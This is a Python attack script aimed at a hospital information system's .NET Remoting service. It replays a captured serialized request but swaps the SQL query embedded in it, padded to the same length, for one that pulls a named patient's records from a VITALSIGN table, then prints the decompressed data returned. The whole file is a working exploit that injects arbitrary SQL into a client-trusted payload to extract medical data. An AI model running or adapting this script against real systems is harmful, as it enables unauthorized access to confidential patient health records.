import requests
import zlib

class HISClientExm:
    def __init__(self, template_file="HISExmFacade_payload_0.bin"):
        self.base_url = "http://10.10.246.90:8800"
        self.template_file = template_file
        self.headers = {
            "Content-Type": "application/octet-stream",
            "X-Compress": "yes",
            "User-Agent": "Mozilla/4.0+(compatible; MSIE 6.0; Windows 6.2.9200.0; MS .NET Remoting; MS .NET CLR 2.0.50727.9164 )",
            "Expect": "100-continue",
            "Host": "10.10.246.90:8800",
            "Connection": "Keep-Alive"
        }

    def run_query(self, sql=None):
        print(f"[*] Testing HISExmFacade...")
        try:
            with open(self.template_file, "rb") as f:
                compressed_template = f.read()
            
            try:
                decompressed = zlib.decompress(compressed_template)
            except:
                decompressed = compressed_template
            
            # Original SQL in template: SELECT * FROM BASCODE WHERE SYSTEMID = 'ORMPRJ' AND SYSCODETYPE = 'OF' AND HISSYSCODE = 'A03772' AND CANCELYN = 'N'
            # We want to replace it if sql provided.
            # We need to find the SQL string in the binary/xml.
            # It starts with 'sSELECT' (s indicates string type in this serialization?)
            
            original_sql_bytes = b"SELECT * FROM BASCODE WHERE SYSTEMID = 'ORMPRJ' AND SYSCODETYPE = 'OF' AND HISSYSCODE = 'A03772' AND CANCELYN = 'N'"
            
            if original_sql_bytes not in decompressed:
                print("[-] Original SQL not found in template.")
                return

            target_len = len(original_sql_bytes)
            print(f"[*] Original SQL Length: {target_len}")

            # Target SQL
            # Try VITALSIGN table
            my_sql = "SELECT * FROM VITALSIGN WHERE HHISNUM = '003617083J'"
            
            if len(my_sql) > target_len:
                print(f"[-] MySQL is too long: {len(my_sql)} > {target_len}")
                return
            
            # Pad with spaces
            padded_sql = my_sql.ljust(target_len)
            print(f"[*] Padded SQL: '{padded_sql}'")
            
            patched_payload = decompressed.replace(original_sql_bytes, padded_sql.encode('utf-8'))
            
            final_payload = zlib.compress(patched_payload)
            response = requests.post(f"{self.base_url}/HISExmFacade", data=final_payload, headers=self.headers)
            print(f"[*] Response Status: {response.status_code}")
            
            if response.status_code == 200:
                 dec = zlib.decompress(response.content)
                 decoded = dec.decode('utf-8', errors='ignore')
                 
                 print("\n--- Full Response Preview ---")
                 # Print a larger chunk to see data
                 print(decoded[:5000])
                 
                 if "<diffgr:diffgram" in decoded and "<VITALSIGN" in decoded:
                      print("\n[+] Data Pattern Found!")
                 elif "<diffgr:diffgram" in decoded:
                      print("\n[+] Diffgram found but maybe empty?")
            
        except Exception as e:
            print(f"[-] Error: {e}")

if __name__ == "__main__":
    client = HISClientExm()
    client.run_query()
